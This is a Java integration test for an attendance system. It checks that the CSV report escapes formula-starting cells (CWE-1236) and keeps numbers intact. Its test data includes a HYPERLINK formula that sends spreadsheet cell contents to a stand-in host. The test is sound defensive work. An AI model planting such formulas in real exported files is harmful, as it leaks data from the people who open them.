package edu.cent35.asistencias.integracion;

import edu.cent35.asistencias.DatosDePrueba;
import edu.cent35.asistencias.config.TenantContext;
import edu.cent35.asistencias.model.Asistencia;
import edu.cent35.asistencias.model.BloquePresencia;
import edu.cent35.asistencias.model.Carrera;
import edu.cent35.asistencias.model.CicloLectivo;
import edu.cent35.asistencias.model.Comision;
import edu.cent35.asistencias.model.Docente;
import edu.cent35.asistencias.model.EstadoAsistencia;
import edu.cent35.asistencias.model.EstadoCierre;
import edu.cent35.asistencias.model.EstadoSalida;
import edu.cent35.asistencias.model.Horario;
import edu.cent35.asistencias.model.Institucion;
import edu.cent35.asistencias.model.Materia;
import edu.cent35.asistencias.model.MetodoAsistencia;
import edu.cent35.asistencias.model.OrigenMarca;
import edu.cent35.asistencias.model.PuestoCaptura;
import edu.cent35.asistencias.model.Rol;
import edu.cent35.asistencias.model.Usuario;
import edu.cent35.asistencias.repository.AsistenciaRepository;
import edu.cent35.asistencias.repository.BloquePresenciaRepository;
import edu.cent35.asistencias.repository.CarreraRepository;
import edu.cent35.asistencias.repository.CicloLectivoRepository;
import edu.cent35.asistencias.repository.ComisionRepository;
import edu.cent35.asistencias.repository.DocenteRepository;
import edu.cent35.asistencias.repository.HorarioRepository;
import edu.cent35.asistencias.repository.InstitucionRepository;
import edu.cent35.asistencias.repository.MateriaRepository;
import edu.cent35.asistencias.repository.PeriodoLectivoRepository;
import edu.cent35.asistencias.repository.PuestoCapturaRepository;
import edu.cent35.asistencias.repository.RolRepository;
import edu.cent35.asistencias.repository.UsuarioRepository;
import edu.cent35.asistencias.seguridad.UsuarioAutenticado;
import edu.cent35.asistencias.service.PuestoCapturaService;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * El CSV del reporte no le entrega fórmulas a la planilla (CWE-1236).
 *
 * <p><b>Por qué existe este test.</b> El CSV no se mira en un visor de texto: se abre en Excel
 * o en LibreOffice, y ahí una celda que empieza con '=' no es un dato, es una fórmula que se
 * evalúa sola al abrir el archivo. Buena parte de lo que va en el reporte lo escribe gente
 * —el nombre de una materia, el de una cámara, el apellido de un docente—, y quien descarga
 * el reporte no es la misma persona que lo escribió. Es la única salida del sistema donde un
 * texto cargado por alguien termina ejecutándose en la máquina de otro.
 *
 * <p>Va como IT y no como test de unidad porque lo que hay que sostener es el archivo que sale
 * por la ruta de descarga, con los datos viniendo de la base: el escape es de una sola línea,
 * pero alcanza con que una columna se arme por fuera del helper para que el agujero vuelva.
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class DescargaCsvSeguraIT {

    private static final AtomicInteger SECUENCIA = new AtomicInteger();

    private static final LocalDate LUNES = LocalDate.of(2026, 6, 15);

    /** Lo que de verdad intentaría alguien: abre una URL con el contenido de la planilla. */
    private static final String MATERIA_CON_FORMULA =
        "=HYPERLINK(\"http://ejemplo.invalido/?d=\"&A1,\"Ver notas\")";

    @Autowired private MockMvc mockMvc;
    @Autowired private InstitucionRepository institucionRepository;
    @Autowired private CarreraRepository carreraRepository;
    @Autowired private MateriaRepository materiaRepository;
    @Autowired private ComisionRepository comisionRepository;
    @Autowired private HorarioRepository horarioRepository;
    @Autowired private DocenteRepository docenteRepository;
    @Autowired private CicloLectivoRepository cicloRepository;
    @Autowired private PeriodoLectivoRepository periodoRepository;
    @Autowired private AsistenciaRepository asistenciaRepository;
    @Autowired private BloquePresenciaRepository bloqueRepository;
    @Autowired private RolRepository rolRepository;
    @Autowired private UsuarioRepository usuarioRepository;
    @Autowired private PuestoCapturaRepository puestoRepository;
    @Autowired private PuestoCapturaService puestoService;

    private Long tenantId;
    private Usuario cuenta;

    @BeforeEach
    void sembrar() {
        Institucion inst = institucionRepository.save(Institucion.builder()
            .nombre("Instituto del CSV " + SECUENCIA.incrementAndGet())
            .activo(true).build());
        tenantId = inst.getId();
        TenantContext.set(tenantId);

        Rol rol = rolRepository.findByCodigo("INSTITUCION").orElseGet(() -> {
            Rol nuevo = new Rol();
            nuevo.setCodigo("INSTITUCION");
            nuevo.setDescripcion("Institucion");
            return rolRepository.save(nuevo);
        });
        Usuario u = Usuario.builder()
            .username("csv." + tenantId).email("csv." + tenantId + "@test.local")
            .passwordHash("no-se-usa").activo(true).rol(rol)
            .emailVerificadoEn(LocalDateTime.now())
            .build();
        u.setInstitucionId(tenantId);
        cuenta = usuarioRepository.save(u);

        Carrera carrera = Carrera.builder()
            .codigo("CSV-" + tenantId).nombre("Tecnicatura").duracionAnios((short) 3)
            .activo(true).build();
        carrera.setInstitucionId(tenantId);
        carrera = carreraRepository.save(carrera);

        // Una materia con la fórmula adentro: el campo no tiene restricción de caracteres,
        // solo de largo, así que este nombre se puede cargar desde la pantalla.
        Materia materia = Materia.builder()
            .codigo("CSV1-" + tenantId).nombre(MATERIA_CON_FORMULA).carrera(carrera)
            .anio((short) 1).activo(true).build();
        materia.setInstitucionId(tenantId);
        materia = materiaRepository.save(materia);

        // Apellido con '+' y nombre con un tabulador adelante: los otros dos arranques.
        Docente docente = Docente.builder()
            .persona(DatosDePrueba.personaDelTenant(
                tenantId, "44" + tenantId, "\tAna", "+Pérez"))
            .fechaAlta(LocalDate.of(2020, 1, 1)).activo(true).build();
        docente.setInstitucionId(tenantId);
        docente = docenteRepository.save(docente);

        CicloLectivo ciclo = cicloRepository.save(
            DatosDePrueba.cicloAnualDelTenant(tenantId, 2026));

        Comision comision = comisionRepository.save(Comision.builder()
            .materia(materia).codigo("@A").docenteAsignado(docente).activo(true)
            .periodo(ciclo.getPeriodos().get(0))
            .build());

        Horario horario = horarioRepository.save(Horario.builder()
            .comision(comision)
            .diaSemana((byte) LUNES.getDayOfWeek().getValue())
            .horaInicio(LocalTime.of(18, 0)).horaFin(LocalTime.of(20, 0))
            .toleranciaMin((short) 15).activo(true)
            .build());

        // El nombre del equipo lo escribe la institución y también viaja al CSV.
        puestoService.designar(tenantId, "-Entrada norte", cuenta);
        PuestoCaptura puesto = puestoRepository.deInstitucion(tenantId).get(0);

        BloquePresencia bloque = BloquePresencia.builder()
            .docente(docente).fecha(LUNES)
            .horaEntrada(LocalTime.of(18, 0)).horaSalida(LocalTime.of(20, 0))
            .origenEntrada(OrigenMarca.AUTOMATICO).origenSalida(OrigenMarca.AUTOMATICO)
            .estadoCierre(EstadoCierre.CERRADO_POR_ROSTRO)
            .estadoSalida(EstadoSalida.EN_HORA)
            .puesto(puesto).puestoSalida(puesto)
            .build();
        bloque.setInstitucionId(tenantId);
        bloque = bloqueRepository.save(bloque);

        Asistencia a = Asistencia.builder()
            .docente(docente).comision(comision).horario(horario).bloque(bloque)
            .fecha(LUNES).horaRegistrada(LocalTime.of(18, 0))
            .estado(EstadoAsistencia.PRESENTE).metodo(MetodoAsistencia.AUTOMATICO)
            .build();
        a.setInstitucionId(tenantId);
        asistenciaRepository.save(a);
    }

    @AfterEach
    void limpiar() {
        if (tenantId != null) {
            borrar(asistenciaRepository, a -> tenantId.equals(a.getInstitucionId()));
            borrar(bloqueRepository, b -> tenantId.equals(b.getInstitucionId()));
            borrar(puestoRepository, p -> tenantId.equals(p.getInstitucionId()));
            List<Long> comisionIds = comisionRepository.findAllDelTenant(tenantId).stream()
                .map(Comision::getId).toList();
            borrar(horarioRepository, h -> comisionIds.contains(h.getComision().getId()));
            borrar(comisionRepository, c -> comisionIds.contains(c.getId()));
            borrar(periodoRepository, p -> tenantId.equals(p.getInstitucionId()));
            borrar(cicloRepository, c -> tenantId.equals(c.getInstitucionId()));
            borrar(materiaRepository, m -> tenantId.equals(m.getInstitucionId()));
            borrar(carreraRepository, c -> tenantId.equals(c.getInstitucionId()));
            borrar(docenteRepository, d -> tenantId.equals(d.getInstitucionId()));
            borrar(usuarioRepository, u -> tenantId.equals(u.getInstitucionId()));
        }
        TenantContext.clear();
    }

    @Test
    @DisplayName("Ninguna celda del CSV arranca con un caracter que la planilla evalue")
    void ningunaCeldaArrancaFormula() throws Exception {
        String csv = descargar();

        // Partir por ';' alcanza porque ningun valor sembrado trae ese caracter; si lo
        // trajera, el campo iria entrecomillado y esto lo cortaria al medio.
        for (String linea : csv.split("\r?\n")) {
            for (String celda : linea.split(";", -1)) {
                if (celda.isEmpty()) {
                    continue;
                }
                // El escape de comillas va por fuera: lo que se mira es el primer caracter
                // del valor, que es lo que la planilla lee para decidir si es una formula.
                String valor = celda.startsWith("\"") ? celda.substring(1) : celda;
                assertThat(valor.isEmpty() || "=+-@\t\r".indexOf(valor.charAt(0)) < 0)
                    .as("la celda «%s» arranca con un caracter que Excel evalua", celda)
                    .isTrue();
            }
        }
    }

    @Test
    @DisplayName("El dato sigue estando entero, con una comilla adelante")
    void elDatoNoSePierde() throws Exception {
        String csv = descargar();

        assertThat(csv)
            .as("la comilla va adentro del campo, pegada a la formula: el campo se entrecomilla"
                + " porque el texto trae comillas, y eso es el escape de siempre (RFC 4180)")
            .contains("\"'=HYPERLINK(")
            .as("y el texto sigue entero, con sus comillas duplicadas")
            .contains("Ver notas")
            .as("el apellido, el nombre con tabulador, la comision y el equipo, igual")
            .contains("'+Pérez")
            .contains("'\tAna")
            .contains("'@A")
            .contains("'-Entrada norte");
    }

    @Test
    @DisplayName("Los numeros salen intactos: una comilla los volveria texto")
    void losNumerosNoSeTocan() throws Exception {
        String csv = descargar();

        assertThat(csv)
            .as("una clase de dos horas cubierta entera, sin comillas en las columnas de minutos")
            .contains(";120;120;0;0;")
            .doesNotContain(";'120")
            .as("tampoco se toca la fecha ni la hora")
            .contains(";2026-06-15;")
            .contains(";18:00:00;");
    }

    // ------------------------------------------------------------------------

    private String descargar() throws Exception {
        return mockMvc.perform(get("/reportes/csv")
                .param("desde", "2026-06-01").param("hasta", "2026-06-30")
                .with(user(new UsuarioAutenticado(cuenta))))
            .andExpect(status().isOk())
            .andReturn().getResponse().getContentAsString();
    }

    private <T> void borrar(org.springframework.data.jpa.repository.JpaRepository<T, ?> repo,
                            java.util.function.Predicate<T> condicion) {
        repo.deleteAll(repo.findAll().stream().filter(condicion).toList());
    }
}
